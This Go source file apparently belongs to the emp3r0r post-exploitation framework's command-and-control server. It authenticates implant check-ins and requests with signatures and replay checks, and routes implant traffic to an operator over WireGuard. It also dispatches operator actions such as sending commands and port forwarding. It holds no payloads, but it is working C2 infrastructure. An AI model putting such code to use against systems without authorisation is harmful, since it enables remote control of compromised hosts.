package server

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// replayNonceCache tracks nonces within the replay window.
var replayNonceCache sync.Map

// checkinReadyChannels tracks pending checkin completions by agent UUID
// Channel is closed when public key is stored, waking up waiting requests
var checkinReadyChannels sync.Map // map[string]chan struct{}

// verifyAgentCAOnly validates CA signature only (for new agent checkin/TOFU).
// This allows new agents to check in without their public key being known yet.
func verifyAgentCAOnly(wrt http.ResponseWriter, req *http.Request) (agentUUID string, ok bool) {
	agentUUID = util.StripANSI(req.Header.Get(transport.HeaderClientID))
	signedTS := util.StripANSI(req.Header.Get(transport.HeaderRequestTimestamp))
	nonce := util.StripANSI(req.Header.Get(transport.HeaderRequestNonce))
	caSigB64 := strings.TrimSpace(req.Header.Get(transport.HeaderClientCASignature))

	if agentUUID == "" || signedTS == "" || nonce == "" || caSigB64 == "" {
		logging.Warningf("verifyAgentCAOnly: missing auth headers from %s", req.RemoteAddr)
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return "", false
	}

	ts, err := strconv.ParseInt(signedTS, 10, 64)
	if err != nil {
		logging.Warningf("verifyAgentCAOnly: bad timestamp %s: %v", strconv.Quote(signedTS), err)
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return "", false
	}
	now := time.Now().Unix()
	if ts <= 0 || abs64(now-ts) > transport.ReplayWindowSeconds {
		logging.Warningf("verifyAgentCAOnly: timestamp outside window for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return "", false
	}

	// Replay protection
	nonceKey := agentUUID + ":" + nonce
	if prev, loaded := replayNonceCache.Load(nonceKey); loaded {
		if prevTS, okTS := prev.(int64); okTS && abs64(now-prevTS) <= transport.ReplayWindowSeconds {
			logging.Warningf("verifyAgentCAOnly: replay detected for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
			http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
			return "", false
		}
	}
	replayNonceCache.Store(nonceKey, ts)
	replayNonceCache.Range(func(k, v interface{}) bool {
		if cachedTS, ok := v.(int64); ok && abs64(now-cachedTS) > transport.ReplayWindowSeconds {
			replayNonceCache.Delete(k)
		}
		return true
	})

	// Verify CA signature
	caSig, err := base64.URLEncoding.DecodeString(caSigB64)
	if err != nil {
		logging.Warningf("verifyAgentCAOnly: invalid CA signature encoding for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return "", false
	}
	caValid, err := transport.VerifySignatureWithCA([]byte(agentUUID), caSig)
	if err != nil || !caValid {
		logging.Warningf("verifyAgentCAOnly: CA verification failed for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return "", false
	}

	return agentUUID, true
}

func verifyAgentRequest(wrt http.ResponseWriter, req *http.Request, expectedAgent string, sessionCheck func(string) bool) bool {
	agentUUID := util.StripANSI(req.Header.Get(transport.HeaderClientID))
	signedTS := util.StripANSI(req.Header.Get(transport.HeaderRequestTimestamp))
	nonce := util.StripANSI(req.Header.Get(transport.HeaderRequestNonce))
	sigB64 := strings.TrimSpace(req.Header.Get(transport.HeaderClientSignature))
	caSigB64 := strings.TrimSpace(req.Header.Get(transport.HeaderClientCASignature))

	if agentUUID == "" || signedTS == "" || nonce == "" || sigB64 == "" || caSigB64 == "" {
		logging.Warningf("verifyAgentRequest: missing auth headers from %s", req.RemoteAddr)
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return false
	}

	if expectedAgent != "" && expectedAgent != agentUUID {
		logging.Warningf("verifyAgentRequest: agent mismatch, expected %s got %s", strconv.Quote(expectedAgent), strconv.Quote(agentUUID))
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}

	ts, err := strconv.ParseInt(signedTS, 10, 64)
	if err != nil {
		logging.Warningf("verifyAgentRequest: bad timestamp %s: %v", strconv.Quote(signedTS), err)
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return false
	}
	now := time.Now().Unix()
	if ts <= 0 || abs64(now-ts) > transport.ReplayWindowSeconds {
		logging.Warningf("verifyAgentRequest: timestamp outside window for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
		http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
		return false
	}

	// Replay protection: nonce + agent scoped within the replay window.
	nonceKey := agentUUID + ":" + nonce
	if prev, ok := replayNonceCache.Load(nonceKey); ok {
		if prevTS, okTS := prev.(int64); okTS && abs64(now-prevTS) <= transport.ReplayWindowSeconds {
			logging.Warningf("verifyAgentRequest: replay detected for %s (agent=%s)", req.URL.Path, strconv.Quote(agentUUID))
			http.Error(wrt, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)
			return false
		}
	}
	replayNonceCache.Store(nonceKey, ts)
	replayNonceCache.Range(func(k, v interface{}) bool {
		if cachedTS, ok := v.(int64); ok && abs64(now-cachedTS) > transport.ReplayWindowSeconds {
			replayNonceCache.Delete(k)
		}
		return true
	})

	caSig, err := base64.URLEncoding.DecodeString(caSigB64)
	if err != nil {
		logging.Warningf("verifyAgentRequest: invalid CA signature encoding for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}
	caValid, err := transport.VerifySignatureWithCA([]byte(agentUUID), caSig)
	if err != nil || !caValid {
		logging.Warningf("verifyAgentRequest: CA verification failed for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}

	pubKey, err := resolveAgentPublicKey(agentUUID)
	if err != nil || pubKey == "" {
		logging.Warningf("verifyAgentRequest: cannot resolve public key for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}

	canonical := transport.CanonicalRequestString(req.Method, req.URL.Path, req.URL.RawQuery, signedTS, nonce)
	sig, err := base64.URLEncoding.DecodeString(sigB64)
	if err != nil {
		logging.Warningf("verifyAgentRequest: invalid signature encoding for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}
	okSig, err := transport.VerifySignatureWithPEM([]byte(pubKey), []byte(canonical), sig)
	if err != nil || !okSig {
		logging.Warningf("verifyAgentRequest: signature verification failed for %s: %v", strconv.Quote(agentUUID), err)
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}

	if sessionCheck != nil && !sessionCheck(agentUUID) {
		logging.Warningf("verifyAgentRequest: session validation failed for %s", strconv.Quote(agentUUID))
		http.Error(wrt, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		return false
	}

	return true
}

func resolveAgentPublicKey(agentUUID string) (string, error) {
	logging.Infof("resolveAgentPublicKey: attempting to resolve key for agent %s", strconv.Quote(agentUUID))

	// Check if there's a pending checkin for this agent
	if readyChanVal, exists := checkinReadyChannels.Load(agentUUID); exists {
		readyChan := readyChanVal.(chan struct{})
		logging.Infof("resolveAgentPublicKey: waiting for checkin to complete for %s", strconv.Quote(agentUUID))

		// Wait for checkin handler to signal completion (or timeout)
		select {
		case <-readyChan:
			logging.Infof("resolveAgentPublicKey: checkin completed for %s, retrieving key", strconv.Quote(agentUUID))
		case <-time.After(5 * time.Second):
			logging.Warningf("resolveAgentPublicKey: timeout waiting for checkin to complete for %s", strconv.Quote(agentUUID))
			return "", fmt.Errorf("timeout waiting for checkin to complete")
		}
	}

	// Now retrieve the public key (should be available after channel closed)
	if agent := agents.GetAgentByUUID(agentUUID); agent != nil {
		if logging.Level >= 4 {
			logging.Debugf("resolveAgentPublicKey: found agent %s in memory, pubkey length=%d", strconv.Quote(agentUUID), len(agent.PublicKey))
		}
		if agent.PublicKey != "" {
			logging.Infof("resolveAgentPublicKey: successfully resolved key from memory for %s", strconv.Quote(agentUUID))
			return agent.PublicKey, nil
		}
	}

	// Fallback to database
	logging.Warningf("resolveAgentPublicKey: agent %s not found in memory, trying database", strconv.Quote(agentUUID))
	if agents.AgentDB != nil {
		stored, err := agents.GetStoredAgent(agentUUID)
		if err != nil {
			return "", err
		}
		if stored != nil {
			if logging.Level >= 4 {
				logging.Debugf("resolveAgentPublicKey: found agent %s in DB, pubkey length=%d", strconv.Quote(agentUUID), len(stored.PublicKey))
			}
			if stored.PublicKey != "" {
				logging.Infof("resolveAgentPublicKey: successfully resolved key from DB for %s", strconv.Quote(agentUUID))
				return stored.PublicKey, nil
			}
		}
	}
	logging.Errorf("resolveAgentPublicKey: public key for agent %s not found in memory or DB", strconv.Quote(agentUUID))
	return "", fmt.Errorf("public key for agent %s not found", agentUUID)
}

func validatePortFwdSessionOwner(sessionID, agentUUID string) bool {
	if sessionID == "" {
		return false
	}

	// Extract base session ID (subsessions have format: sessionID_portNumber)
	baseSessionID := sessionID
	if strings.Contains(sessionID, "_") {
		baseSessionID = strings.Split(sessionID, "_")[0]
	}

	val, ok := network.PortFwds.Load(baseSessionID)
	if !ok {
		return false
	}
	pf := val.(*network.PortFwdSession)
	if pf.Agent != nil && pf.Agent.UUID != "" {
		return pf.Agent.UUID == agentUUID
	}
	return true
}

func abs64(v int64) int64 {
	if v < 0 {
		return -v
	}
	return v
}

// apiDispatcher routes requests to the correct handler.
func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			if r == http.ErrAbortHandler {
				return
			}
			logging.Errorf("apiDispatcher panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	vars := mux.Vars(req)

	if vars["api"] == "" || vars["token"] == "" {
		logging.Debugf("Invalid request: %v, missing api/token", req)
		wrt.WriteHeader(http.StatusNotFound)
		return
	}

	logging.Debugf("Got a request: api=%s, token=%s", vars["api"], vars["token"])

	// forward to operator
	// checkin path
	checkinPath := live.RuntimeConfig.CheckInPath
	if checkinPath == "" {
		checkinPath = "checkin"
	}
	if logging.Level >= 4 {
		logging.Debugf("apiDispatcher: checkinPath configured as %s", strconv.Quote(checkinPath))
	}

	// msg path
	msgPath := live.RuntimeConfig.MsgPath
	if msgPath == "" {
		msgPath = "msg"
	}
	if logging.Level >= 4 {
		logging.Debugf("apiDispatcher: msgPath configured as %s, incoming api=%s", strconv.Quote(msgPath), strconv.Quote(vars["api"]))
	}

	// ftp path
	ftpPath := live.RuntimeConfig.FTPPath
	if ftpPath == "" {
		ftpPath = "ftp"
	}

	// www path
	wwwPath := live.RuntimeConfig.WWWPath
	if wwwPath == "" {
		wwwPath = "www"
	}

	// proxy path
	proxyPath := live.RuntimeConfig.ProxyPath
	if proxyPath == "" {
		proxyPath = "proxy"
	}

	// Create base target URL for operator proxying
	// Use the remote address (operator's IP in the WireGuard network)
	remoteIP, _, _ := net.SplitHostPort(req.RemoteAddr)

	// Determine target IP based on connection source
	targetIP := netutil.WgOperatorIP // Default to primary operator (for direct agents)

	// If request comes from a Relay (WG subnet) or Localhost, proxy back to it
	ip := net.ParseIP(remoteIP)
	if ip != nil {
		if ip.IsLoopback() {
			targetIP = remoteIP
		} else {
			_, subnet, _ := net.ParseCIDR(netutil.WgSubnet)
			if subnet != nil && subnet.Contains(ip) {
				targetIP = remoteIP
			}
		}
	}

	targetURL := fmt.Sprintf("https://%s:%d", targetIP, netutil.WgRelayedHTTPPort)
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		logging.Errorf("apiDispatcher: parsedURL: %v", err)
		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		return
	}

	proxy := httputil.NewSingleHostReverseProxy(parsedURL)

	// Set up a proper director function to preserve query parameters and other request properties
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		logging.Debugf("Proxying to: %s%s?%s", req.URL.Host, req.URL.Path, req.URL.RawQuery)
	}

	rootCAs := x509.NewCertPool()
	capem, err := os.ReadFile(transport.OperatorCaCrtFile)
	if err != nil {
		logging.Errorf("apiDispatcher: parse CA cert: %v", err)
		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		return
	}
	rootCAs.AppendCertsFromPEM([]byte(transport.CACrtPEM))
	rootCAs.AppendCertsFromPEM(capem)
	tlsConfig := &tls.Config{
		ServerName:         netutil.WgOperatorIP, // Use the first operator's IP as the SNI, as it is in the SAN list
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}
	proxy.Transport = &http.Transport{
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	// Add error handling for debugging
	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		logging.Errorf("Proxy error: %v", err)
		http.Error(w, "Proxy error", http.StatusBadGateway)
	}
	// Use the original request's context
	req = req.WithContext(req.Context())

	// handlers
	logging.Infof("apiDispatcher: routing request to api=%s, token=%s", strconv.Quote(vars["api"]), strconv.Quote(vars["token"]))
	switch vars["api"] {
	case checkinPath:
		logging.Infof("apiDispatcher: routing to handleAgentCheckIn (checkin path)")
		// Checkin uses CA-only validation (TOFU: agent public key sent in CBOR body)
		agentUUID, ok := verifyAgentCAOnly(wrt, req)
		if !ok {
			return
		}

		// Create synchronization channel for this checkin
		// Handler will close it when public key is stored
		readyChan := make(chan struct{})
		checkinReadyChannels.Store(agentUUID, readyChan)

		// Pre-register agent placeholder to prevent race condition
		if !agents.IsAgentExistByUUID(agentUUID) {
			logging.Infof("Pre-registering agent %s before checkin handler processes CBOR body", strconv.Quote(agentUUID))
			placeholder := &def.Emp3r0rAgent{
				UUID:      agentUUID,
				PublicKey: "", // Will be filled by handler after CBOR decode
			}
			inx := agents.AssignAgentIndex()
			live.AgentControlMap.Store(placeholder, &live.AgentControl{Index: inx, Conn: nil})
		}
		handleAgentCheckIn(wrt, req)
	case msgPath:
		logging.Infof("apiDispatcher: routing to handleMessageTunnel (msg path)")
		// Message tunnel requires full validation (agent must have checked in first)
		// Token in URL is session/connection identifier, not necessarily agent UUID
		if !verifyAgentRequest(wrt, req, "", nil) {
			return
		}
		handleMessageTunnel(wrt, req)
	case ftpPath:
		if !verifyAgentRequest(wrt, req, "", nil) {
			return
		}
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		proxy.ServeHTTP(wrt, req)
	case wwwPath:
		if !verifyAgentRequest(wrt, req, vars["token"], nil) {
			return
		}
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		logging.Debugf("Forwarding PUT request to operator at %s", targetURL)
		proxy.ServeHTTP(wrt, req)
	case proxyPath:
		sessionID := vars["token"]
		if !verifyAgentRequest(wrt, req, "", func(agentUUID string) bool {
			return validatePortFwdSessionOwner(sessionID, agentUUID)
		}) {
			return
		}
		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
		logging.Debugf("Request headers: %v", req.Header)
		logging.Debugf("Forwarding port mapping request to operator at %s", targetURL)
		proxy.ServeHTTP(wrt, req)
	default:
		logging.Warningf("apiDispatcher: 404 for api=%s, token=%s (expected checkin=%s, msg=%s, ftp=%s, www=%s, proxy=%s)", vars["api"], vars["token"], checkinPath, msgPath, ftpPath, wwwPath, proxyPath)
		wrt.WriteHeader(http.StatusNotFound)
	}
}

// operationDispatcher routes operator requests to the correct handler.
func operationDispatcher(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			if r == http.ErrAbortHandler {
				return
			}
			logging.Errorf("operationDispatcher panicked: %v", r)
			http.Error(w, "Internal server error", http.StatusInternalServerError)
		}
	}()
	vars := mux.Vars(r)
	api := vars["api"]
	logging.Debugf("Operator request: API: %s", api)

	api = fmt.Sprintf("%s/%s", transport.OperatorRoot, api)
	switch api {
	case transport.OperatorMsgTunnel:
		handleOperatorConn(w, r)
	case transport.OperatorSetActiveAgent:
		handleSetActiveAgent(w, r)
	case transport.OperatorSendCommand:
		handleSendCommand(w, r)
	case transport.OperatorListConnectedAgents:
		handleListAgents(w, r)
	case transport.OperatorForgetAgent:
		handleForgetAgent(w, r)
	case transport.OperatorListPortFwds:
		handleListPortFwds(w, r)
	case transport.OperatorRegisterPortFwd:
		handleRegisterPortFwd(w, r)
	case transport.OperatorUnregisterPortFwd:
		handleUnregisterPortFwd(w, r)
	case transport.OperatorGetCA:
		handleGetCA(w, r)
	case transport.OperatorSignAgent:
		handleSignAgent(w, r)
	default:
		http.Error(w, fmt.Sprintf("Invalid API: %s", api), http.StatusNotFound)
	}
}
